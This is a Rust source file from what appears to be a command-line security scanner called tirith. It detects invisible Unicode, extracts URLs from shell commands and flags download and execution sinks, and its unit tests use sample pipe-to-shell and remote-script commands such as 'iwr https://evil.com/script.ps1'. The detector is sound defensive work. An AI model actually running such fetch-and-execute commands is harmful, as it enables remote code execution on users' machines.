fn is_variation_selector(ch: char) -> bool {
    ('\u{FE00}'..='\u{FE0F}').contains(&ch) || ('\u{E0100}'..='\u{E01EF}').contains(&ch)
}

/// Check if a character is a Hangul Filler (invisible Korean character).
fn is_hangul_filler(ch: char) -> bool {
    matches!(
        ch,
        '\u{3164}' // Hangul Filler
        | '\u{115F}' // Hangul Choseong Filler
        | '\u{1160}' // Hangul Jungseong Filler
    )
}

/// Check if a character is an invisible math operator (Function Application,
/// Invisible Times, Invisible Separator, Invisible Plus).
fn is_invisible_math_operator(ch: char) -> bool {
    ('\u{2061}'..='\u{2064}').contains(&ch)
}

/// Stealth-encoding whitespace variant (steganographic spaces). Layout spaces
/// (U+00A0 NBSP, U+202F Narrow NBSP, U+3000 Ideographic) are excluded — they
/// appear legitimately in localized prose.
fn is_invisible_whitespace(ch: char) -> bool {
    matches!(
        ch,
        '\u{2000}' // En Quad
        | '\u{2001}' // Em Quad
        | '\u{2002}' // En Space
        | '\u{2003}' // Em Space
        | '\u{2004}' // Three-Per-Em Space
        | '\u{2005}' // Four-Per-Em Space
        | '\u{2006}' // Six-Per-Em Space
        | '\u{2007}' // Figure Space
        | '\u{2008}' // Punctuation Space
        | '\u{2009}' // Thin Space
        | '\u{200A}' // Hair Space
        | '\u{205F}' // Medium Mathematical Space
    )
}

/// Tier 3: shell-aware tokenize, then extract URL-like patterns per segment.
pub fn extract_urls(input: &str, shell: ShellType) -> Vec<ExtractedUrl> {
    let segments = tokenize::tokenize(input, shell);
    let mut results = Vec::new();

    for (seg_idx, segment) in segments.iter().enumerate() {
        let sink_context = is_sink_context(segment, &segments);
        let resolved = resolve_segment_command(segment);

        // Suppress URL extraction ONLY for the arg span of a first-segment
        // tirith inspection subcommand — not the whole segment. Leading env
        // assignments and wrapper tokens (sudo/env/time) must still be analyzed
        // (`FOO=https://evil.com tirith diff safe` must still flag FOO), so first
        // locate where the literal "tirith" word lives in the segment.
        let inspection_skip_args_from: Option<usize> = if seg_idx == 0 {
            resolved.as_ref().and_then(|cmd| {
                if cmd.name != "tirith" {
                    return None;
                }
                let start_from: usize =
                    if segment.command.as_deref().map(command_base_name).as_deref()
                        == Some("tirith")
                    {
                        0
                    } else if let Some(at) = segment
                        .args
                        .iter()
                        .position(|a| command_base_name(a) == "tirith")
                    {
                        at + 1
                    } else {
                        return None;
                    };
                // Skip flags (e.g. `--quiet`) to land on the subcommand token.
                let mut i = start_from;
                while i < segment.args.len() {
                    let clean = strip_quotes(&segment.args[i]);
                    if clean.starts_with('-') {
                        i += 1;
                        continue;
                    }
                    break;
                }
                let sub_arg = segment.args.get(i)?;
                if is_tirith_inspection_subcommand(&command_base_name(sub_arg)) {
                    Some(i)
                } else {
                    None
                }
            })
        } else {
            None
        };

        // Extract URLs from command + args + leading env-assignment values.
        let mut url_sources: Vec<&str> = Vec::new();
        if let Some(ref cmd) = segment.command {
            url_sources.push(cmd.as_str());
        }
        for (arg_idx, arg) in segment.args.iter().enumerate() {
            // For tirith inspection subcommands, the subcommand word and all
            // later args are the inert arg span — skip URL extraction there.
            if let Some(skip_from) = inspection_skip_args_from {
                if arg_idx >= skip_from {
                    break;
                }
            }
            url_sources.push(arg.as_str());
        }
        for (name, value) in tokenize::leading_env_assignments(&segment.raw) {
            if ignores_env_assignment_url(&name) {
                continue;
            }
            let clean = strip_quotes(&value);
            if !clean.is_empty() {
                push_urls_from_source(&clean, seg_idx, sink_context, &mut results);
            }
        }
        for source in &url_sources {
            push_urls_from_source(source, seg_idx, sink_context, &mut results);
        }

        // Schemeless URLs in sink contexts. Skip docker/podman/nerdctl — their
        // args are handled as DockerRef below.
        let is_docker_cmd = resolved
            .as_ref()
            .is_some_and(|cmd| matches!(cmd.name.as_str(), "docker" | "podman" | "nerdctl"));
        if sink_context && !is_docker_cmd {
            if let Some(cmd) = resolved.as_ref() {
                // scp/rsync args are remote specs (parse_scp_remote_spec below)
                // or local file paths — never schemeless domains. Skip the
                // heuristic here; scheme-full URLs still hit URL_REGEX earlier.
                let is_remote_copy = matches!(cmd.name.as_str(), "scp" | "rsync");
                // M6 ch1 — `go install/get <module>` takes a module path that
                // looks schemeless (`github.com/spf13/cobra`), so carve out args
                // AFTER the `install`/`get` subcommand to avoid a forced WARN on
                // every `go install`. Scheme-full URLs still hit URL_REGEX.
                let go_install_skip_from = if cmd.name == "go" {
                    cmd.args
                        .iter()
                        .position(|a| matches!(a.to_lowercase().as_str(), "install" | "get"))
                        .map(|pos| pos + 1)
                } else {
                    None
                };
                for (arg_idx, arg) in cmd.args.iter().enumerate() {
                    // Skip args that are output-file flag values
                    if is_output_flag_value(&cmd.name, cmd.args, arg_idx) {
                        continue;
                    }
                    if let Some(skip_from) = go_install_skip_from {
                        if arg_idx >= skip_from {
                            continue;
                        }
                    }
                    let clean = strip_quotes(arg);
                    if is_remote_copy {
                        // Validate the spec shape (for downstream policy) but
                        // never emit schemeless for remote specs or local files.
                        let _ = parse_scp_remote_spec(&clean, shell);
                        continue;
                    }
                    if looks_like_schemeless_host(&clean) && !URL_REGEX.is_match(&clean) {
                        results.push(ExtractedUrl {
                            raw: clean.clone(),
                            parsed: UrlLike::SchemelessHostPath {
                                host: extract_host_from_schemeless(&clean),
                                path: extract_path_from_schemeless(&clean),
                            },
                            segment_index: seg_idx,
                            in_sink_context: true,
                        });
                    }
                }
            }
        }

        // Check for Docker refs in docker commands
        if let Some(cmd) = resolved.as_ref() {
            if matches!(cmd.name.as_str(), "docker" | "podman" | "nerdctl") {
                if let Some(docker_subcmd) = cmd.args.first() {
                    let subcmd_lower = docker_subcmd.to_lowercase();
                    if subcmd_lower == "build" {
                        // `docker build` takes the image ref from -t/--tag.
                        // Every other arg is build context / flags.
                        let mut i = 1;
                        while i < cmd.args.len() {
                            let arg = strip_quotes(&cmd.args[i]);
                            if (arg == "-t" || arg == "--tag") && i + 1 < cmd.args.len() {
                                let tag_val = strip_quotes(&cmd.args[i + 1]);
                                if !tag_val.is_empty() {
                                    let docker_url = parse::parse_docker_ref(&tag_val);
                                    results.push(ExtractedUrl {
                                        raw: tag_val,
                                        parsed: docker_url,
                                        segment_index: seg_idx,
                                        in_sink_context: true,
                                    });
                                }
                                i += 2;
                            } else if arg.starts_with("-t") && arg.len() > 2 {
                                let tag_val = strip_quotes(&arg[2..]);
                                let docker_url = parse::parse_docker_ref(&tag_val);
                                results.push(ExtractedUrl {
                                    raw: tag_val,
                                    parsed: docker_url,
                                    segment_index: seg_idx,
                                    in_sink_context: true,
                                });
                                i += 1;
                            } else if let Some(val) = arg.strip_prefix("--tag=") {
                                let tag_val = strip_quotes(val);
                                let docker_url = parse::parse_docker_ref(&tag_val);
                                results.push(ExtractedUrl {
                                    raw: tag_val,
                                    parsed: docker_url,
                                    segment_index: seg_idx,
                                    in_sink_context: true,
                                });
                                i += 1;
                            } else {
                                i += 1;
                            }
                        }
                    } else if subcmd_lower == "image" {
                        // `docker image pull/push/...` — real subcommand is args[1].
                        if let Some(image_subcmd) = cmd.args.get(1) {
                            let image_subcmd_lower = image_subcmd.to_lowercase();
                            if matches!(
                                image_subcmd_lower.as_str(),
                                "pull" | "push" | "inspect" | "rm" | "tag"
                            ) {
                                extract_first_docker_image(&cmd.args[2..], seg_idx, &mut results);
                            }
                        }
                    } else if matches!(subcmd_lower.as_str(), "pull" | "run" | "create") {
                        // First non-flag arg is the image; any later args are
                        // arguments to the containerized command, not refs.
                        extract_first_docker_image(&cmd.args[1..], seg_idx, &mut results);
                    }
                }
            }
        }
    }

    results
}

/// An extracted URL with context.
#[derive(Debug, Clone)]
pub struct ExtractedUrl {
    pub raw: String,
    pub parsed: UrlLike,
    pub segment_index: usize,
    pub in_sink_context: bool,
}

/// Common value-taking flags across docker subcommands.
const DOCKER_VALUE_FLAGS: &[&str] = &[
    "--platform",
    "--format",
    "--filter",
    "-f",
    "--label",
    "-l",
    "--name",
    "--hostname",
    "--user",
    "-u",
    "--workdir",
    "-w",
    "--network",
    "--net",
    "--env",
    "-e",
    "--env-file",
    "--publish",
    "-p",
    "--expose",
    "--volume",
    "-v",
    "--mount",
    "--add-host",
    "--device",
    "--entrypoint",
    "--log-driver",
    "--log-opt",
    "--restart",
    "--runtime",
    "--cpus",
    "--cpu-shares",
    "--cpu-quota",
    "--memory",
    "--memory-reservation",
    "--memory-swap",
    "--shm-size",
    "--ulimit",
    "--security-opt",
    "--sysctl",
    "--tmpfs",
    "--gpus",
    "--ipc",
    "--pid",
    "--userns",
    "--cgroupns",
];

/// Short flags that may embed their value inline (e.g., -p8080:80).
const DOCKER_VALUE_PREFIXES: &[&str] = &["-p", "-e", "-v", "-l", "-u", "-w"];

/// Extract the first non-flag argument as a Docker image reference.
fn extract_first_docker_image(args: &[String], seg_idx: usize, results: &mut Vec<ExtractedUrl>) {
    let mut skip_next = false;
    let mut end_of_options = false;
    for arg in args {
        if skip_next {
            skip_next = false;
            continue;
        }
        let clean = strip_quotes(arg);
        if clean == "--" {
            end_of_options = true;
            continue;
        }
        if !end_of_options && clean.starts_with("--") && clean.contains('=') {
            continue;
        }
        if !end_of_options && clean.starts_with('-') {
            if DOCKER_VALUE_FLAGS.iter().any(|f| clean == *f) {
                skip_next = true;
            }
            if DOCKER_VALUE_PREFIXES
                .iter()
                .any(|p| clean.starts_with(p) && clean.len() > p.len())
            {
                continue;
            }
            continue;
        }
        if !clean.contains("://") && clean != "." && clean != ".." && clean != "-" {
            let docker_url = parse::parse_docker_ref(&clean);
            results.push(ExtractedUrl {
                raw: clean,
                parsed: docker_url,
                segment_index: seg_idx,
                in_sink_context: true,
            });
        }
        // Only the FIRST non-flag arg is the image; anything else is the
        // containerized command's argv.
        break;
    }
}

#[derive(Debug, Clone)]
struct ResolvedCommand<'a> {
    name: String,
    args: &'a [String],
}

fn push_urls_from_source(
    source: &str,
    segment_index: usize,
    in_sink_context: bool,
    results: &mut Vec<ExtractedUrl>,
) {
    for mat in URL_REGEX.find_iter(source) {
        let raw = mat.as_str().to_string();
        let url = parse::parse_url(&raw);
        results.push(ExtractedUrl {
            raw,
            parsed: url,
            segment_index,
            in_sink_context,
        });
    }
}

fn ignores_env_assignment_url(name: &str) -> bool {
    let upper = name.to_ascii_uppercase();
    upper == "NO_PROXY" || upper.ends_with("_PROXY")
}

fn env_long_flag_takes_value(flag: &str) -> bool {
    let name = flag.split_once('=').map(|(name, _)| name).unwrap_or(flag);
    matches!(name, "--unset" | "--chdir" | "--split-string")
}

fn command_base_name(raw: &str) -> String {
    let clean = strip_quotes(raw);
    clean
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(clean.as_str())
        .to_lowercase()
}

fn resolve_segment_command(segment: &Segment) -> Option<ResolvedCommand<'_>> {
    let command = segment.command.as_ref()?;
    resolve_named_command(command, &segment.args)
}

/// Resolve a segment's command through wrappers (`env`, `command`, `time`,
/// `sudo`/`doas`, `tirith`) and return the resolved name and the wrapped
/// command's args. Callers outside the extractor (e.g. `check_network_policy`)
/// use this so wrapped invocations like `sudo curl …` or `env curl …` get the
/// same policy treatment as the bare command.
///
/// Returns `None` if the segment has no command or the wrapper chain can't be
/// resolved (e.g. `sudo` with no command word).
pub fn resolve_wrapped_command(segment: &Segment) -> Option<(String, Vec<String>)> {
    let resolved = resolve_segment_command(segment)?;
    Some((resolved.name, resolved.args.to_vec()))
}

fn resolve_named_command<'a>(command: &str, args: &'a [String]) -> Option<ResolvedCommand<'a>> {
    let name = command_base_name(command);
    match name.as_str() {
        "env" => resolve_env_command(args),
        "command" => resolve_command_wrapper(args),
        "time" => resolve_time_wrapper(args),
        "sudo" | "doas" => resolve_sudo_wrapper(args),
        "tirith" => resolve_tirith_command(args),
        _ => Some(ResolvedCommand { name, args }),
    }
}

/// Resolve through a `sudo`/`doas` wrapper to the real command, handling the
/// common flag shapes (`-u user`, `--user=user`, `-E -H`, leading `VAR=val`).
/// Conservative: returns None when the command can't be unambiguously resolved,
/// so the caller falls back to the literal first token.
fn resolve_sudo_wrapper(args: &[String]) -> Option<ResolvedCommand<'_>> {
    // Short sudo(8) flags that take a VALUE. Boolean-only flags (-S -A -B -E -H
    // -K -L -l -n -P -s -V -v, and -h=--help not --host) must NOT be here —
    // treating them as value-taking would eat the next token.
    const SUDO_VALUE_FLAGS: &[&str] = &["-u", "-g", "-p", "-C", "-D", "-U", "-r", "-t"];
    // Long flags that take a value unless combined with `=`.
    const SUDO_LONG_VALUE_FLAGS: &[&str] = &[
        "--user",
        "--group",
        "--prompt",
        "--close-from",
        "--chdir",
        "--other-user",
        "--role",
        "--type",
        "--host",
    ];

    let mut i = 0;
    let mut after_dashdash = false;
    while i < args.len() {
        let clean = strip_quotes(&args[i]);
        if !after_dashdash && clean == "--" {
            after_dashdash = true;
            i += 1;
            continue;
        }
        // Env-style assignments before the command (sudo VAR=val cmd)
        if !after_dashdash && tokenize::is_env_assignment(&clean) {
            i += 1;
            continue;
        }
        if !after_dashdash && clean.starts_with("--") {
            let name_part = clean.split_once('=').map(|(n, _)| n).unwrap_or(&clean);
            if !clean.contains('=') && SUDO_LONG_VALUE_FLAGS.contains(&name_part) {
                i += 2;
            } else {
                i += 1;
            }
            continue;
        }
        if !after_dashdash && clean.starts_with('-') {
            if SUDO_VALUE_FLAGS.contains(&clean.as_str()) {
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }
        // First non-flag, non-assignment argument is the wrapped command.
        return resolve_named_command(&clean, &args[i + 1..]);
    }
    None
}

fn resolve_env_command(args: &[String]) -> Option<ResolvedCommand<'_>> {
    let mut i = 0;
    while i < args.len() {
        let clean = strip_quotes(&args[i]);
        if clean == "--" {
            i += 1;
            break;
        }
        if tokenize::is_env_assignment(&clean) {
            i += 1;
            continue;
        }
        if clean.starts_with('-') {
            if clean.starts_with("--") {
                if env_long_flag_takes_value(&clean) && !clean.contains('=') {
                    i += 2;
                } else {
                    i += 1;
                }
                continue;
            }
            if clean == "-u" || clean == "-C" || clean == "-S" {
                i += 2;
                continue;
            }
            i += 1;
            continue;
        }
        return resolve_named_command(&clean, &args[i + 1..]);
    }

    while i < args.len() {
        let clean = strip_quotes(&args[i]);
        if tokenize::is_env_assignment(&clean) {
            i += 1;
            continue;
        }
        return resolve_named_command(&clean, &args[i + 1..]);
    }

    None
}

fn resolve_command_wrapper(args: &[String]) -> Option<ResolvedCommand<'_>> {
    let mut i = 0;
    while i < args.len() {
        let clean = strip_quotes(&args[i]);
        if clean == "--" {
            i += 1;
            break;
        }
        if clean.starts_with('-') {
            i += 1;
            continue;
        }
        break;
    }
    args.get(i)
        .and_then(|arg| resolve_named_command(arg, &args[i + 1..]))
}

fn resolve_time_wrapper(args: &[String]) -> Option<ResolvedCommand<'_>> {
    let mut i = 0;
    while i < args.len() {
        let clean = strip_quotes(&args[i]);
        if clean == "--" {
            i += 1;
            break;
        }
        if clean.starts_with('-') {
            if clean == "-f" || clean == "--format" || clean == "-o" || clean == "--output" {
                i += 2;
            } else {
                i += 1;
            }
            continue;
        }
        break;
    }
    args.get(i)
        .and_then(|arg| resolve_named_command(arg, &args[i + 1..]))
}

fn resolve_tirith_command(args: &[String]) -> Option<ResolvedCommand<'_>> {
    let subcommand = args.first().map(|arg| command_base_name(arg))?;
    match subcommand.as_str() {
        "run" => Some(ResolvedCommand {
            name: "tirith-run".to_string(),
            args: &args[1..],
        }),
        _ => Some(ResolvedCommand {
            name: "tirith".to_string(),
            args,
        }),
    }
}

/// Whether a tirith subcommand is an "inspection" command (describe/score a
/// deliberately-typed suspicious input, not execute it), for which URL
/// extraction and the exec-context byte-scan are suppressed. Deliberately
/// narrow — adding anything else requires a motivating false-positive fixture.
fn is_tirith_inspection_subcommand(sub: &str) -> bool {
    matches!(sub, "diff" | "score" | "why" | "receipt" | "explain")
}

/// Resolve the first segment as a tirith inspection subcommand and, when
/// matched, return the byte range of the arg span after the subcommand word —
/// the inert region skipped by URL extraction and Unicode-style byte scans.
///
/// Returns `None` for non-tirith commands, `tirith run` (a sink — URL analysis
/// still applies), non-inspection subcommands, and inputs that don't tokenize
/// cleanly. Resolves through env/command/time/sudo wrappers; leading flags
/// (`tirith --quiet diff URL`) are handled. Only the FIRST segment is covered.
pub fn tirith_inert_arg_range(input: &str, shell: ShellType) -> Option<std::ops::Range<usize>> {
    let segments = tokenize::tokenize(input, shell);
    let first = segments.first()?;

    // Resolve the segment's command through wrappers — must end at "tirith".
    let resolved = resolve_segment_command(first)?;
    if resolved.name != "tirith" {
        return None;
    }

    // First non-flag arg is the subcommand (resolve_tirith_command already
    // stripped wrapper prefixes, so start from args[0]).
    let mut sub_idx = 0;
    while sub_idx < resolved.args.len() {
        let clean = strip_quotes(&resolved.args[sub_idx]);
        if clean.starts_with('-') {
            sub_idx += 1;
            continue;
        }
        break;
    }
    let sub_arg = resolved.args.get(sub_idx)?;
    let subcommand = command_base_name(sub_arg);
    if !is_tirith_inspection_subcommand(&subcommand) {
        return None;
    }

    // Inert range = everything after the subcommand word in this segment.
    // Locate the token by whitespace-delimited match (not raw substring), else
    // `tirith --config=diff diff URL` would match `diff` inside `--config=diff`.
    let seg_slice = input.get(first.byte_range.clone())?;
    let sub_rel = find_subcommand_token(seg_slice, sub_arg.as_str())?;
    let inert_start = first.byte_range.start + sub_rel + sub_arg.len();
    let inert_end = first.byte_range.end;
    if inert_start >= inert_end {
        return None;
    }
    Some(inert_start..inert_end)
}

/// Find the byte offset within `haystack` where the subcommand token `needle`
/// begins — only matching when preceded by start-of-string or whitespace.
/// Prevents `--config=diff` from matching `diff` in `tirith --config=diff diff URL`.
fn find_subcommand_token(haystack: &str, needle: &str) -> Option<usize> {
    let bytes = haystack.as_bytes();
    let n = needle.len();
    let mut search_from = 0;
    while let Some(rel) = haystack.get(search_from..)?.find(needle) {
        let abs = search_from + rel;
        let preceded_by_ws_or_start =
            abs == 0 || matches!(bytes.get(abs - 1), Some(b) if b.is_ascii_whitespace());
        // Require a word boundary at the end too, so `differ` doesn't match `diff`.
        let followed_by_ws_or_end = abs + n == bytes.len()
            || matches!(bytes.get(abs + n), Some(b) if b.is_ascii_whitespace());
        if preceded_by_ws_or_start && followed_by_ws_or_end {
            return Some(abs);
        }
        search_from = abs + 1;
    }
    None
}

/// Check if a segment is in a "sink" context (executing/downloading).
fn is_sink_context(segment: &Segment, _all_segments: &[Segment]) -> bool {
    if let Some(cmd) = resolve_segment_command(segment) {
        let cmd_lower = cmd.name;
        // git is only a sink for download subcommands (clone, fetch, pull, etc.)
        if cmd_lower == "git" {
            return is_git_sink(cmd.args);
        }
        if is_source_command(&cmd_lower) {
            return true;
        }
    }

    // Check if this segment pipes into a sink
    if let Some(sep) = &segment.preceding_separator {
        if sep == "|" || sep == "|&" {
            // This segment receives piped input — check if it's an interpreter
            if let Some(cmd) = resolve_segment_command(segment) {
                if is_interpreter(&cmd.name) {
                    return true;
                }
            }
        }
    }

    false
}

fn is_source_command(cmd: &str) -> bool {
    matches!(
        cmd,
        "curl"
            | "wget"
            | "http"
            | "https"
            | "xh"
            | "fetch"
            | "scp"
            | "rsync"
            | "docker"
            | "podman"
            | "nerdctl"
            | "pip"
            | "pip3"
            | "npm"
            | "npx"
            | "yarn"
            | "pnpm"
            | "go"
            | "cargo"
            | "iwr"
            | "irm"
            | "invoke-webrequest"
            | "invoke-restmethod"
            | "tirith-run"
    )
}

/// Parsed scp/rsync remote spec of shape `[user@]host:path`, returned by
/// [`parse_scp_remote_spec`] so callers (e.g. `network_deny`) can route on the
/// host without re-parsing. `path` is the literal remainder after the first
/// `:`, unnormalized. A real parser (vs a substring check) keeps the
/// shell-aware Windows drive-letter guard verifiable.
pub struct ScpRemoteSpec {
    pub user: Option<String>,
    pub host: String,
    pub path: String,
}

/// Parse `[user@]host:path` from an scp/rsync argument. Accepts `host:path` and
/// `user@host:path`; rejects flags, `://` URLs, `:` preceded by `/` (absolute
/// local path), empty/`/`-containing hosts, and Windows drive-letter shapes.
///
/// Windows drive-letter guard — narrow so it doesn't break legitimate one-letter
/// SSH aliases (`scp file x:/tmp/`): `X:\...` rejected ALWAYS; `X:/...` rejected
/// only on PowerShell/Cmd (POSIX treats it as an alias); `X:foo` accepted
/// everywhere (ambiguous with scp's `x:relative-path`; back-compat wins).
pub fn parse_scp_remote_spec(arg: &str, shell: ShellType) -> Option<ScpRemoteSpec> {
    if arg.is_empty() || arg.starts_with('-') || arg.contains("://") {
        return None;
    }

    // Two shapes: (1) `user@host[:path]` — colon optional; we accept bare
    // `user@host` to suppress a `looks_like_schemeless_host` false positive.
    // (2) `host:path` — no `@`, colon required.
    if let Some(at_pos) = arg.find('@') {
        let before_at = &arg[..at_pos];
        let after_at = &arg[at_pos + 1..];
        if before_at.is_empty() || after_at.is_empty() || before_at.contains(':') {
            return None;
        }
        let (host, path) = match after_at.find(':') {
            Some(colon_pos) => {
                // `:` preceded by `/` is a colon inside a path, not a boundary.
                if colon_pos > 0 && after_at.as_bytes()[colon_pos - 1] == b'/' {
                    return None;
                }
                (
                    &after_at[..colon_pos],
                    after_at[colon_pos + 1..].to_string(),
                )
            }
            None => (after_at, String::new()),
        };
        if !is_valid_scp_host(host) {
            return None;
        }
        return Some(ScpRemoteSpec {
            user: Some(before_at.to_string()),
            host: host.to_string(),
            path,
        });
    }

    // No `@` — must have `host:path` with an explicit colon.
    let colon_pos = arg.find(':')?;
    if colon_pos > 0 && arg.as_bytes()[colon_pos - 1] == b'/' {
        return None;
    }
    let host = &arg[..colon_pos];
    let after_colon = &arg[colon_pos + 1..];
    if !is_valid_scp_host(host) {
        return None;
    }

    // Windows drive-letter guard — only when host is a single ASCII letter and
    // `user@` is absent (see fn doc for the shape breakdown).
    if host.len() == 1 && host.chars().next().unwrap().is_ascii_alphabetic() {
        let first_after = after_colon.chars().next();
        match first_after {
            Some('\\') => return None,
            Some('/') if matches!(shell, ShellType::PowerShell | ShellType::Cmd) => {
                return None;
            }
            _ => {}
        }
    }

    Some(ScpRemoteSpec {
        user: None,
        host: host.to_string(),
        path: after_colon.to_string(),
    })
}

fn is_valid_scp_host(host: &str) -> bool {
    !host.is_empty()
        && !host.contains('/')
        && !host.contains(':')
        && host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
}

/// Check if a git command is in a sink context (only subcommands that download).
/// `git add`, `git commit`, `git status`, etc. are NOT sinks.
fn is_git_sink(args: &[String]) -> bool {
    if args.is_empty() {
        return false;
    }
    // First non-flag arg is the subcommand
    for arg in args {
        let clean = strip_quotes(arg);
        if clean.starts_with('-') {
            continue;
        }
        return matches!(
            clean.as_str(),
            "clone" | "fetch" | "pull" | "submodule" | "remote"
        );
    }
    false
}

fn is_interpreter(cmd: &str) -> bool {
    matches!(
        cmd,
        "sh" | "bash"
            | "zsh"
            | "dash"
            | "ksh"
            | "python"
            | "python3"
            | "node"
            | "perl"
            | "ruby"
            | "php"
            | "iex"
            | "invoke-expression"
    )
}

/// Whether the arg at `arg_index` is an output-file/credential flag value (which
/// can look like a domain) and should be skipped during schemeless URL detection.
fn is_output_flag_value(cmd: &str, args: &[String], arg_index: usize) -> bool {
    let cmd_lower = cmd.to_lowercase();
    let cmd_base = cmd_lower.rsplit('/').next().unwrap_or(&cmd_lower);

    match cmd_base {
        "curl" => {
            if arg_index > 0 {
                let prev = strip_quotes(&args[arg_index - 1]);
                if prev == "-o"
                    || prev == "--output"
                    || prev == "-u"
                    || prev == "--user"
                    || prev == "-U"
                    || prev == "--proxy-user"
                {
                    return true;
                }
            }
            let current = strip_quotes(&args[arg_index]);
            if current.starts_with("-o") && current.len() > 2 && !current.starts_with("--") {
                return true;
            }
            if current.starts_with("--output=")
                || current.starts_with("--user=")
                || current.starts_with("--proxy-user=")
            {
                return true;
            }
            false
        }
        "wget" => {
            if arg_index > 0 {
                let prev = strip_quotes(&args[arg_index - 1]);
                if prev == "-O"
                    || prev == "--output-document"
                    || prev == "--user"
                    || prev == "--password"
                    || prev == "--http-user"
                    || prev == "--http-password"
                    || prev == "--ftp-user"
                    || prev == "--ftp-password"
                    || prev == "--proxy-user"
                    || prev == "--proxy-password"
                {
                    return true;
                }
            }
            let current = strip_quotes(&args[arg_index]);
            if current.starts_with("-O") && current.len() > 2 && !current.starts_with("--") {
                return true;
            }
            if current.starts_with("--output-document=")
                || current.starts_with("--user=")
                || current.starts_with("--password=")
                || current.starts_with("--http-user=")
                || current.starts_with("--http-password=")
                || current.starts_with("--ftp-user=")
                || current.starts_with("--ftp-password=")
                || current.starts_with("--proxy-user=")
                || current.starts_with("--proxy-password=")
            {
                return true;
            }
            false
        }
        "http" | "https" | "xh" => {
            if arg_index > 0 {
                let prev = strip_quotes(&args[arg_index - 1]);
                if prev == "-a" || prev == "--auth" {
                    return true;
                }
            }
            let current = strip_quotes(&args[arg_index]);
            if current.starts_with("--auth=") {
                return true;
            }
            false
        }
        _ => false,
    }
}

fn strip_quotes(s: &str) -> String {
    let s = s.trim();
    if s.len() >= 2
        && ((s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')))
    {
        s[1..s.len() - 1].to_string()
    } else {
        s.to_string()
    }
}

fn looks_like_schemeless_host(s: &str) -> bool {
    if s.starts_with('-') || !s.contains('.') {
        return false;
    }
    // Dotfiles (.gitignore, .env.example) are not URLs.
    if s.starts_with('.') {
        return false;
    }
    let host_part = s.split('/').next().unwrap_or(s);
    if !host_part.contains('.') || host_part.contains(' ') {
        return false;
    }
    // Exclude file-looking host parts (e.g. "install.sh") ONLY when there is no
    // meaningful path. With a real path (evil.zip/payload) the host is likely a
    // domain even if its TLD overlaps a file ext; a trailing slash alone doesn't count.
    let host_lower = host_part.to_lowercase();
    let has_meaningful_path = s.find('/').is_some_and(|idx| {
        let after_slash = &s[idx + 1..];
        !after_slash.is_empty() && after_slash != "/"
    });
    if !has_meaningful_path {
        let file_exts = [
            ".sh",
            ".py",
            ".rb",
            ".js",
            ".ts",
            ".go",
            ".rs",
            ".c",
            ".h",
            ".txt",
            ".md",
            ".json",
            ".yaml",
            ".yml",
            ".xml",
            ".html",
            ".css",
            ".tar.gz",
            ".tar.bz2",
            ".tar.xz",
            ".tgz",
            ".zip",
            ".gz",
            ".bz2",
            ".rpm",
            ".deb",
            ".pkg",
            ".dmg",
            ".exe",
            ".msi",
            ".dll",
            ".so",
            ".log",
            ".conf",
            ".cfg",
            ".ini",
            ".toml",
            ".png",
            ".jpg",
            ".jpeg",
            ".gif",
            ".bmp",
            ".ico",
            ".tiff",
            ".tif",
            ".pdf",
            ".csv",
            ".mp3",
            ".mp4",
            ".wav",
            ".avi",
            ".mkv",
            ".flac",
            ".ogg",
            ".webm",
            ".ttf",
            ".otf",
            ".woff",
            ".woff2",
            ".docx",
            ".xlsx",
            ".pptx",
            ".sqlite",
            ".lock",
            ".example",
            ".local",
            ".bak",
            ".tmp",
            ".swp",
            ".orig",
            ".patch",
            ".diff",
            ".map",
            ".env",
            ".sample",
            ".dist",
            ".editorconfig",
        ];
        if file_exts.iter().any(|ext| host_lower.ends_with(ext)) {
            return false;
        }
    }
    // Need at least 2 labels ("example.com", not "file.txt").
    let labels: Vec<&str> = host_part.split('.').collect();
    if labels.len() < 2 {
        return false;
    }
    // TLD must be 2-63 alphabetic chars (DNS label max).
    let tld = labels.last().unwrap();
    tld.len() >= 2 && tld.len() <= 63 && tld.chars().all(|c| c.is_ascii_alphabetic())
}

fn extract_host_from_schemeless(s: &str) -> String {
    s.split('/').next().unwrap_or(s).to_string()
}

fn extract_path_from_schemeless(s: &str) -> String {
    if let Some(idx) = s.find('/') {
        s[idx..].to_string()
    } else {
        String::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_tier1_exec_matches_url() {
        assert!(tier1_scan("curl https://example.com", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_no_match_simple() {
        assert!(!tier1_scan("ls -la", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_no_match_echo() {
        assert!(!tier1_scan("echo hello world", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_pipe_bash() {
        assert!(tier1_scan("something | bash", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_pipe_sudo_bash() {
        assert!(tier1_scan("something | sudo bash", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_pipe_env_bash() {
        assert!(tier1_scan("something | env bash", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_pipe_bin_bash() {
        assert!(tier1_scan("something | /bin/bash", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_git_scp() {
        assert!(tier1_scan(
            "git clone git@github.com:user/repo",
            ScanContext::Exec
        ));
    }

    #[test]
    fn test_tier1_exec_matches_punycode() {
        assert!(tier1_scan(
            "curl https://xn--example-cua.com",
            ScanContext::Exec
        ));
    }

    #[test]
    fn test_tier1_exec_matches_docker() {
        assert!(tier1_scan("docker pull malicious/image", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_iwr() {
        assert!(tier1_scan(
            "iwr https://evil.com/script.ps1",
            ScanContext::Exec
        ));
    }

    #[test]
    fn test_tier1_exec_matches_curl() {
        assert!(tier1_scan(
            "curl https://example.com/install.sh",
            ScanContext::Exec
        ));
    }

    #[test]
    fn test_tier1_exec_matches_lookalike_tld() {
        assert!(tier1_scan("open file.zip", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_exec_matches_shortener() {
        assert!(tier1_scan("curl bit.ly/abc", ScanContext::Exec));
    }

    #[test]
    fn test_tier1_paste_matches_non_ascii() {
        assert!(tier1_scan("café", ScanContext::Paste));
    }

    #[test]
    fn test_tier1_paste_exec_patterns_also_match() {
        assert!(tier1_scan("curl https://example.com", ScanContext::Paste));
    }
